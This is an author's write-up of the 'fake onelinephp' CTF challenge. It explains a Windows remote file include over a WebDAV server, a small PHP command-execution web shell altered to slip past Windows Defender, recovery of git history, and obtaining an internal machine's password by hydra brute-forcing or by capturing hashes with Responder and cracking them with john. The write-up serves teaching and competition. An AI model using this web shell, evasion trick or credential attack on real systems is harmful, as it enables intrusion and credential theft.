### fake onelinephp

> auther：w1nd
> point：windows remote file include + bypass windows defender + windows password brute

I'm  very sorry that the challenge was down in the beginning. The configuration had something wrong and the amount of requests was unexpected.

![image-20191203104632497](/Users/w1nd233/Library/Application Support/typora-user-images/image-20191203104632497.png)The design of this challenge is quite open. It is also very interesting to see the your guys solving the challenge. :)

The first thing you will see is [orange's one-line-php](https://github.com/orangetw/My-CTF-Web-Challenges#one-line-php-challenge). The purpose here is only to give a point to include file. The original solution needs to know the temporary file path, but it is not easy in this challenge.(Still some teams got it

Because the cloud service provider will block smb in China, so you can't use smb.So I turn on the webclient service on the windows server.

So just build a webdav server and the payload: 

`http://fakeonelinephp.d3ctf.io/?orange=\\xx.xx.xx.xx\webdav\shell.php`

```
version: '3.5'
services:
  webdav:
    image: bytemark/webdav
    volumes:
      - ./data/dav:/var/lib/dav
      - ./data/apache2:/usr/local/apache2
    environment:
      - ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND
      - LOCATION=/webdav
    ports:
      - 80:80
```

(However I see some team use smb successfully,emmmmm

When a remote file is included, windows defender will kill it, so you need to do a bit confuse to bypass it, there are many ways to bypass, for example

```php
@<?php
system(file_get_contents("php://input"));?>
```

~~ps: you guys upload your shell so frequently has caused windows defender to be the process with the highest CPU usage on the server~~

When you get shell you will find that there are only index.php, webdav and .git in the web directory. The webdav is empty, as I just want to remind you that the webclient is on, so there is only .git left. 

Investigate the use of git here. 

[Git hack](https://github.com/lijiejie/GitHack) we use most can only restore naive. You need to use `git reflog` + ` git reset` to restore hint2.txt and dict.txt
I got a tool from 0ops which can recover the hint2.txt and dict.txt directly https://github.com/gakki429/Git_Extract

hin2.txt
![](https://i.imgur.com/agJh7Yy.png)
dict.txt
![](https://i.imgur.com/4ssUepK.png)

hint2.txt shows the location of flag, on the desktop of internal machine, and the password dictionary is given.There is no unique solution at this step.

1. upload hydra to brute it
2. forward the 3389 port of internal machine to brute it

(of course your tools should bypass windows defender)

Most teams solve this challenge like that.In fact, I consider about limiting bruting when I designed the challenge, but multiple teams used the same environment, and it was very painful if someone make trouble , so I give up

3. get the hash and use john to brute it

I think this is more feasible in real env

find a tool to receive the hash `python2 Responder.py -I eth0 -f`
![](https://i.imgur.com/et06TEx.png)
use john to brute it
![](https://i.imgur.com/K0RCSAy.png)

you can use ipc to get the flag as you got the password

![](https://i.imgur.com/hr0yGi7.png)

Ps：

In fact, I saw many tools uploaded by other teams , but I did not deleted them deliberately , such as hydra, packaged html.zip
However, I feel that it is not good, as it will have some impact on other teams. For example, some teams were cheated by fake html.zip and fake hint.txt , I am very sorry about that , I will try to design a better challenge next year(maybe..